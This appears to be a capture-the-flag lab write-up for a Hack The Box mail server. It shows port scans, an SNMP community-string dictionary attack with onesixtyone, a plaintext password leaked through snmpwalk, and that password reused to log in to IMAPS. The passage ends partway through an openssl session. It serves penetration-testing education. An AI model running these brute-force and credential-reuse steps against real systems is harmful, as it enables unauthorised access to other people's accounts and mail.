# Third part

### Table of Contents
1. [Objective](#objective)
2. [Initial Reconnaissance](#initial-reconnaissance)
  - [TCP Enumeration](#tcp-enumeration)
  - [Port Analysis](#port-analysis)
  - [SSH Enumeration](#ssh-enumeration)
  - [IMAP/POP3 Enumeration](#imappop3-enumeration)
  - [UDP Enumeration](#udp-enumeration)
3. [SNMP Exploitation](#snmp-exploitation)
  - [SNMP Enumeration](#snmp-enumeration)
  - [Community String Discovery](#community-string-discovery)
  - [Credential Extraction](#credential-extraction)
4. [Mail Server Access](#mail-server-access)
  - [IMAPS Connection](#imaps-connection)
  - [Mailbox Enumeration](#mailbox-enumeration)
  - [SSH Key Discovery](#ssh-key-discovery)
5. [System Access](#system-access)
  - [SSH Key Configuration](#ssh-key-configuration)
  - [SSH Connection](#ssh-connection)
  - [System Reconnaissance](#system-reconnaissance)
6. [Database Access](#database-access)
  - [MySQL Connection](#mysql-connection)
  - [Database Enumeration](#database-enumeration)
  - [Flag Capture](#flag-capture)

---

### Objective

### `subject :`
```
The third server is an MX and management server for the internal network.
Subsequently, this server has the function of a backup server for the internal accounts in the domain.
Accordingly, a user named HTB was also created here, whose credentials we need to access.
```

---

### `resolution :`

## Initial Reconnaissance

### TCP Enumeration



### Enumeration (TCP)
```
sudo nmap 10.129.202.20 -A
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-11 03:13 CST
Nmap scan report for 10.129.202.20
Host is up (0.050s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: STLS UIDL USER AUTH-RESP-CODE RESP-CODES SASL(PLAIN) PIPELINING CAPA TOP
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
143/tcp open  imap     Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_imap-capabilities: more LOGIN-REFERRALS STARTTLS capabilities have post-login IMAP4rev1 ID ENABLE IDLE Pre-login listed LITERAL+ SASL-IR AUTH=PLAINA0001 OK
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: LOGIN-REFERRALS AUTH=PLAINA0001 capabilities more have IMAP4rev1 ID ENABLE IDLE post-login listed LITERAL+ Pre-login SASL-IR OK
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_ssl-date: TLS randomness does not represent time
995/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) RESP-CODES USER UIDL CAPA PIPELINING AUTH-RESP-CODE TOP
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=12/11%OT=22%CT=1%CU=37795%PV=Y%DS=2%DC=T%G=Y%TM=693
OS:A8C14%P=x86_64-pc-linux-gnu)SEQ()SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I
OS:%TS=A)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=B)OPS(O1=M552ST11NW7%O2
OS:=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)W
OS:IN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=N)ECN(R=Y%DF=Y%
OS:T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=O%F=AS%RD=0%Q=)T
OS:1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T4(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=O%A=Z%F=R%O=%RD=0%
OS:Q=)T5(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%
OS:RD=0%Q=)T7(R=N)U1(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G
OS:%RUCK=G%RUD=G)IE(R=N)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   50.12 ms 10.10.14.1
2   50.18 ms 10.129.202.20

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 206.58 seconds
```

### Port Analysis

Here is a list of all open port services (TCP)

| Port | Details | Course |
| ---  | ------- | ------|
| 22  | Secure Shell | [SSH](../../Courses/Protocols/SSH/readme.md) |
| 110  | POP3 | [POP3](../../Courses/Protocols/POP3/readme.md) |
| 143 | Imap | [IMAP](../../Courses/Protocols/IMAP/readme.md) |
| 993 | ssl/imap |  |
| 995 | ssl/pop3 |  |

>ssl-cert: Subject: commonName=NIXHARD

### SSH Enumeration

To enumerate SSH, I used the [ssh-audit](https://github.com/arthepsy/ssh-audit) tool.

Clone it and change to the directory.
```
git clone https://github.com/arthepsy/ssh-audit.git && cd ssh-audit
```

Run ssh-audit with the target IP.
```
./ssh-audit.py 10.129.202.20
```

```
# general
(gen) banner: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3
(gen) software: OpenSSH 8.2p1
(gen) compatibility: OpenSSH 7.4+, Dropbear SSH 2020.79+
(gen) compression: enabled (zlib@openssh.com)

# key exchange algorithms
(kex) curve25519-sha256                     -- [warn] does not provide protection against post-quantum attacks
                                            `- [info] available since OpenSSH 7.4, Dropbear SSH 2018.76
                                            `- [info] default key exchange from OpenSSH 7.4 to 8.9
(kex) curve25519-sha256@libssh.org          -- [warn] does not provide protection against post-quantum attacks
                                            `- [info] available since OpenSSH 6.4, Dropbear SSH 2013.62
                                            `- [info] default key exchange from OpenSSH 6.5 to 7.3
(kex) ecdh-sha2-nistp256                    -- [fail] using elliptic curves that are suspected as being backdoored by the U.S. National Security Agency
                                            `- [warn] does not provide protection against post-quantum attacks
                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
(kex) ecdh-sha2-nistp384                    -- [fail] using elliptic curves that are suspected as being backdoored by the U.S. National Security Agency
                                            `- [warn] does not provide protection against post-quantum attacks
                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
(kex) ecdh-sha2-nistp521                    -- [fail] using elliptic curves that are suspected as being backdoored by the U.S. National Security Agency
                                            `- [warn] does not provide protection against post-quantum attacks
                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
(kex) diffie-hellman-group-exchange-sha256 (3072-bit) -- [warn] does not provide protection against post-quantum attacks
                                                      `- [info] available since OpenSSH 4.4
                                                      `- [info] OpenSSH's GEX fallback mechanism was triggered during testing. Very old SSH clients will still be able to create connections using a 2048-bit modulus, though modern clients will use 3072. This can only be disabled by recompiling the code (see https://github.com/openssh/openssh-portable/blob/V_9_4/dh.c#L477).
(kex) diffie-hellman-group16-sha512         -- [warn] does not provide protection against post-quantum attacks
                                            `- [info] available since OpenSSH 7.3, Dropbear SSH 2016.73
(kex) diffie-hellman-group18-sha512         -- [warn] does not provide protection against post-quantum attacks
                                            `- [info] available since OpenSSH 7.3
(kex) diffie-hellman-group14-sha256         -- [warn] 2048-bit modulus only provides 112-bits of symmetric strength
                                            `- [warn] does not provide protection against post-quantum attacks
                                            `- [info] available since OpenSSH 7.3, Dropbear SSH 2016.73

# host-key algorithms
(key) rsa-sha2-512 (3072-bit)               -- [info] available since OpenSSH 7.2
(key) rsa-sha2-256 (3072-bit)               -- [info] available since OpenSSH 7.2, Dropbear SSH 2020.79
(key) ssh-rsa (3072-bit)                    -- [fail] using broken SHA-1 hash algorithm
                                            `- [info] available since OpenSSH 2.5.0, Dropbear SSH 0.28
                                            `- [info] deprecated in OpenSSH 8.8: https://www.openssh.com/txt/release-8.8
(key) ecdsa-sha2-nistp256                   -- [fail] using elliptic curves that are suspected as being backdoored by the U.S. National Security Agency
                                            `- [warn] using weak random number generator could reveal the key
                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
(key) ssh-ed25519                           -- [info] available since OpenSSH 6.5, Dropbear SSH 2020.79

# encryption algorithms (ciphers)
(enc) chacha20-poly1305@openssh.com         -- [warn] vulnerable to the Terrapin attack (CVE-2023-48795), allowing message prefix truncation
                                            `- [info] available since OpenSSH 6.5, Dropbear SSH 2020.79
                                            `- [info] default cipher since OpenSSH 6.9
(enc) aes128-ctr                            -- [info] available since OpenSSH 3.7, Dropbear SSH 0.52
(enc) aes192-ctr                            -- [info] available since OpenSSH 3.7
(enc) aes256-ctr                            -- [info] available since OpenSSH 3.7, Dropbear SSH 0.52
(enc) aes128-gcm@openssh.com                -- [info] available since OpenSSH 6.2
(enc) aes256-gcm@openssh.com                -- [info] available since OpenSSH 6.2

# message authentication code algorithms
(mac) umac-64-etm@openssh.com               -- [warn] using small 64-bit tag size
                                            `- [info] available since OpenSSH 6.2
(mac) umac-128-etm@openssh.com              -- [info] available since OpenSSH 6.2
(mac) hmac-sha2-256-etm@openssh.com         -- [info] available since OpenSSH 6.2
(mac) hmac-sha2-512-etm@openssh.com         -- [info] available since OpenSSH 6.2
(mac) hmac-sha1-etm@openssh.com             -- [fail] using broken SHA-1 hash algorithm
                                            `- [info] available since OpenSSH 6.2
(mac) umac-64@openssh.com                   -- [warn] using encrypt-and-MAC mode
                                            `- [warn] using small 64-bit tag size
                                            `- [info] available since OpenSSH 4.7
(mac) umac-128@openssh.com                  -- [warn] using encrypt-and-MAC mode
                                            `- [info] available since OpenSSH 6.2
(mac) hmac-sha2-256                         -- [warn] using encrypt-and-MAC mode
                                            `- [info] available since OpenSSH 5.9, Dropbear SSH 2013.56
(mac) hmac-sha2-512                         -- [warn] using encrypt-and-MAC mode
                                            `- [info] available since OpenSSH 5.9, Dropbear SSH 2013.56
(mac) hmac-sha1                             -- [fail] using broken SHA-1 hash algorithm
                                            `- [warn] using encrypt-and-MAC mode
                                            `- [info] available since OpenSSH 2.1.0, Dropbear SSH 0.28

# fingerprints
(fin) ssh-ed25519: SHA256:AtNYHXCA7dVpi58LB+uuPe9xvc2lJwA6y7q82kZoBNM
(fin) ssh-rsa: SHA256:gYf8woxUQ0oVmCnny4K4fmsnijf3aZcdeZGb2kKxPUQ

# algorithm recommendations (for OpenSSH 8.2)
(rec) -ecdh-sha2-nistp256                   -- kex algorithm to remove 
(rec) -ecdh-sha2-nistp384                   -- kex algorithm to remove 
(rec) -ecdh-sha2-nistp521                   -- kex algorithm to remove 
(rec) -ecdsa-sha2-nistp256                  -- key algorithm to remove 
(rec) -hmac-sha1                            -- mac algorithm to remove 
(rec) -hmac-sha1-etm@openssh.com            -- mac algorithm to remove 
(rec) -ssh-rsa                              -- key algorithm to remove 
(rec) !diffie-hellman-group-exchange-sha256 -- kex algorithm to change (increase modulus size to 3072 bits or larger) 
(rec) -chacha20-poly1305@openssh.com        -- enc algorithm to remove 
(rec) -curve25519-sha256                    -- kex algorithm to remove 
(rec) -curve25519-sha256@libssh.org         -- kex algorithm to remove 
(rec) -diffie-hellman-group14-sha256        -- kex algorithm to remove 
(rec) -diffie-hellman-group16-sha512        -- kex algorithm to remove 
(rec) -diffie-hellman-group18-sha512        -- kex algorithm to remove 
(rec) -hmac-sha2-256                        -- mac algorithm to remove 
(rec) -hmac-sha2-512                        -- mac algorithm to remove 
(rec) -umac-128@openssh.com                 -- mac algorithm to remove 
(rec) -umac-64-etm@openssh.com              -- mac algorithm to remove 
(rec) -umac-64@openssh.com                  -- mac algorithm to remove 

# additional info
(nfo) For hardening guides on common OSes, a built-in list can be viewed with --list-hardening-guides, or an online list can be found at: <https://www.ssh-audit.com/hardening_guides.html>
(nfo) Potentially insufficient connection throttling detected, resulting in possible vulnerability to the DHEat DoS attack (CVE-2002-20001).  38 connections were created in 1.500 seconds, or 25.3 conns/sec; server must respond with a rate less than 20.0 conns/sec per IPv4/IPv6 source address to be considered safe.  For rate-throttling options, please see <https://www.ssh-audit.com/hardening_guides.html>.  Be aware that using 'PerSourceMaxStartups 1' properly protects the server from this attack, but will cause this test to yield a false positive.  Suppress this test and message with the --skip-rate-test option.
```

From this output, we can learn some information about the SSH version:
```
# general
(gen) banner: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3
(gen) software: OpenSSH 8.2p1
(gen) compatibility: OpenSSH 7.4+, Dropbear SSH 2020.79+
(gen) compression: enabled (zlib@openssh.com)
``` 

There is also a possible vulnerability to a DHEat DoS attack.

**notes**: Our goal is to find the HTB user password, so the Denial of Service vulnerability is not useful in our case. However, in a real-world scenario, we would need to inform the client about this issue.

### IMAP/POP3 Enumeration

For this part, I tried to connect to the imaps and pop3s services to verify if the allow_anonymous setting was enabled. 

```
openssl s_client -connect 10.129.39.135:imaps
```

```
40778188617F0000:error:8000006F:system library:BIO_connect:Connection refused:../crypto/bio/bio_sock2.c:114:calling connect()
40778188617F0000:error:10000067:BIO routines:BIO_connect:connect error:../crypto/bio/bio_sock2.c:116:
connect:errno=111
```

```
openssl s_client -connect 10.129.14.128:pop3s
```
```
4047B5BEA97F0000:error:8000006F:system library:BIO_connect:Connection refused:../crypto/bio/bio_sock2.c:114:calling connect()
4047B5BEA97F0000:error:10000067:BIO routines:BIO_connect:connect error:../crypto/bio/bio_sock2.c:116:
connect:errno=111
```

At this moment, I was stuck on these results. During the coffee break, I remembered that the aggressive scan of nmap does not scan for UDP ports.

---

## SNMP Exploitation

### UDP Enumeration

> -sU scan for UDP ports

```bash
sudo nmap 10.129.202.20 -sU
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-11 04:56 CST
Nmap scan report for 10.129.202.20
Host is up (0.052s latency).
Not shown: 990 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
161/udp   open   snmp 
631/udp   closed ipp
764/udp   closed omserv
17494/udp closed unknown
18250/udp closed unknown
20003/udp closed commtact-https
20679/udp closed unknown
21476/udp closed unknown
32770/udp closed sometimes-rpc4
49153/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 4.68 seconds
```

From this output, we can see that only the SNMP port is open. 

### SNMP Enumeration



The command `snmpwalk` is a network reconnaissance tool used to query a device running the Simple Network Management Protocol (SNMP).
```
snmpwalk -v2c -c public 10.129.202.20
```
But there we can see that using public community string isn't working. (must be disabled by admin) 

```
Timeout: No Response from 10.129.202.20
```

### Community String Discovery

To continue SNMP enumeration, I used another tool named onesixtyone.


This tool is a SNMP scanner made for speed. It is used to perform a dictionary attack (brute-force) against the SNMP service.
```
onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.197.149
```
> -c is used to specify a specific wordlist (in this case we used seclists).

```
Scanning 1 hosts, 3219 communities
10.129.197.149 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
```
At first, I didn't spot any "new" results in this output, but after looking at example outputs from onesixtyone, I found it.

The wanted information is `[backup]` (It is the community string changed against public). 

We can retry to connect to snmp with the new `[backup]` community string.
```
snmpwalk -v2c -c backup 10.129.197.149
```
> -v2c specifies the version of SNMP we want to use.


### Credential Extraction

```iso.3.6.1.2.1.1.1.0 = STRING: "Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (165955) 0:27:39.55
iso.3.6.1.2.1.1.4.0 = STRING: "Admin <tech@inlanefreight.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "NIXHARD"
iso.3.6.1.2.1.1.6.0 = STRING: "Inlanefreight"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (29) 0:00:00.29
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (29) 0:00:00.29
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (29) 0:00:00.29
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (29) 0:00:00.29
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (29) 0:00:00.29
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (29) 0:00:00.29
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (29) 0:00:00.29
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (29) 0:00:00.29
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (29) 0:00:00.29
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (29) 0:00:00.29
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (29) 0:00:00.29
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (167199) 0:27:51.99
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 0C 0B 0F 15 13 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.4.0-90-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro ipv6.disable=1 maybe-ubiquity
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 158
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.1.1.0 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761" # <- Likely crendentials
iso.3.6.1.2.1.25.1.7.1.2.1.4.6.66.65.67.75.85.80 = ""
iso.3.6.1.2.1.25.1.7.1.2.1.5.6.66.65.67.75.85.80 = INTEGER: 5
iso.3.6.1.2.1.25.1.7.1.2.1.6.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.7.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.20.6.66.65.67.75.85.80 = INTEGER: 4
iso.3.6.1.2.1.25.1.7.1.2.1.21.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.3.1.1.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
iso.3.6.1.2.1.25.1.7.1.3.1.2.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:
Authentication token manipulation error
chpasswd: (line 1, user tom) password not changed
Changing password for tom."
iso.3.6.1.2.1.25.1.7.1.3.1.3.6.66.65.67.75.85.80 = INTEGER: 4
iso.3.6.1.2.1.25.1.7.1.3.1.4.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.1 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.2 = STRING: "Authentication token manipulation error"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.3 = STRING: "chpasswd: (line 1, user tom) password not changed"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = STRING: "Changing password for tom."
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

>tom NMds732Js2761

---

## Mail Server Access

### IMAPS Connection

### Exploit credentials

With the new credentials in hand, we can try to use them with the imaps service.

```
curl -k 'imaps://10.129.197.149' --user tom:NMds732Js2761 -v
```

> -v is for verbose mode 

```
*   Trying 10.129.197.149:993...
* Connected to 10.129.197.149 (10.129.197.149) port 993 (#0)
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
* Server certificate:
*  subject: CN=NIXHARD
*  start date: Nov 10 01:30:25 2021 GMT
*  expire date: Nov  8 01:30:25 2031 GMT
*  issuer: CN=NIXHARD
*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* old SSL session ID is stale, removing
< * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] Dovecot (Ubuntu) ready.
> A001 CAPABILITY
< * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN
< A001 OK Pre-login capabilities listed, post-login capabilities have more.
> A002 AUTHENTICATE PLAIN AHRvbQBOTWRzNzMySnMyNzYx
< * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE
< A002 OK Logged in
> A003 LIST "" *
< * LIST (\HasNoChildren) "." Notes
* LIST (\HasNoChildren) "." Notes
< * LIST (\HasNoChildren) "." Meetings
* LIST (\HasNoChildren) "." Meetings
< * LIST (\HasNoChildren \UnMarked) "." Important
* LIST (\HasNoChildren \UnMarked) "." Important
< * LIST (\HasNoChildren) "." INBOX
* LIST (\HasNoChildren) "." INBOX
< A003 OK List completed (0.009 + 0.000 + 0.008 secs).
* Connection #0 to host 10.129.197.149 left intact
```

Here we have successfully connected to imaps with Tom's account.
We can see that a list of folders appears at the end of the output.

### Mailbox Enumeration

So the next step is to connect to imaps to take a look inside these folders.
```
openssl s_client -connect 10.129.197.149:imaps
```

```
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 CN = NIXHARD
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN = NIXHARD
verify return:1
---
Certificate chain
 0 s:CN = NIXHARD
   i:CN = NIXHARD
   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
   v:NotBefore: Nov 10 01:30:25 2021 GMT; NotAfter: Nov  8 01:30:25 2031 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIC0zCCAbugAwIBAgIUC6tYfrtqQqCrhjYv11bUtaKet3EwDQYJKoZIhvcNAQEL
BQAwEjEQMA4GA1UEAwwHTklYSEFSRDAeFw0yMTExMTAwMTMwMjVaFw0zMTExMDgw
MTMwMjVaMBIxEDAOBgNVBAMMB05JWEhBUkQwggEiMA0GCSqGSIb3DQEBAQUAA4IB
DwAwggEKAoIBAQDEBpDfkH4Ro5ZXW44NvnF3N9lKz27V1hgRppyUk5y/SEPKt2zj
EU+r2tEHUeHoJHQZBbW0ybxh+X2H3ZPNEG9nV1GtFQfTBVcrUEpN5VV15aIbdh+q
j53pp/wcL/d8+Zg2ZAaVYWvQHVqtsAudQmynrV1MHA39A44fG3/SutKlurY8AKR0
MW5zMPtflMc/N3+lH8UUMBf2Q+zNSyZLiBEihxK3kfMW92HqWeh016egSIFuxUsH
kk4xpGmyG9NDYna47dQzoHCg+42KgqFvWrGw2nIccaEIX5XA8rU9u53C7EQzDzmQ
vAtHpKWBwNmiivxAz/QC7MPExWIWtZtOqxmfAgMBAAGjITAfMAkGA1UdEwQCMAAw
EgYDVR0RBAswCYIHTklYSEFSRDANBgkqhkiG9w0BAQsFAAOCAQEAG+Dm9pLJgNGC
X1YmznmtBUekhXMrU67tQl745fFasJQzIrDgVtK27fjAtQRwvIbDruSwTj47E7+O
XdS7qyjFNBerklWNq4fEAVI7BmkxnTS9542okA/+UmeG70LdKjzFS+LjjOnyWzTh
YwU8uUjLfnRca74kY0DkVHOIkwZQha0J+BrKSADq/zDjkG0g4v0vzHINOmHx9eiE
67NoJKJPY5S3RYWxl/4x8Kphx7PNJBPC75gYjlxxDhxdYu9a3daqJUa58/qOm6P8
w1P9nA6lkg7NopyqepulLAzIcqnTjb/nMD2Pd9b6vgWc3IqSfFreqjzshZ+FjNZo
zR+tR6z4TQ==
-----END CERTIFICATE-----
subject=CN = NIXHARD
issuer=CN = NIXHARD
---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: RSA-PSS
Server Temp Key: X25519, 253 bits
---
SSL handshake has read 1283 bytes and written 377 bytes
Verification error: self-signed certificate
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Server public key is 2048 bit
Secure Renegotiation IS NOT supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 18 (self-signed certificate)
---
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 30DB7E48DD1124E04FFEEAFADDA3FFD8871D1A8D452CE78E51530430EF935DB3
    Session-ID-ctx: 
    Resumption PSK: 9C2DFA0D5AB0935F335148203582F5EEB526BAB098F2B262726A4853A423127058B0C6BC0EE5CF06DF2F8F5FB0BC65B6
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 0a 0d ac 66 db 5c be 83-7a 18 db e0 6d bd 97 e9   ...f.\..z...m...
    0010 - 3c 2e 75 f0 9a 01 58 82-f8 15 3f 08 1b cb 7a ff   <.u...X...?...z.
    0020 - e3 d3 48 c2 34 ee c3 15-92 95 ad 2a a6 ad cd 34   ..H.4......*...4
    0030 - 46 8b 99 fa 95 97 d3 81-c0 8f 77 e5 92 99 e2 24   F.........w....$
    0040 - e9 15 2a 06 24 93 3b a5-48 ef 64 c1 1b 30 a7 5d   ..*.$.;.H.d..0.]
    0050 - 02 f0 07 1f 70 a2 83 46-01 51 49 5d b7 1a 6f 03   ....p..F.QI]..o.
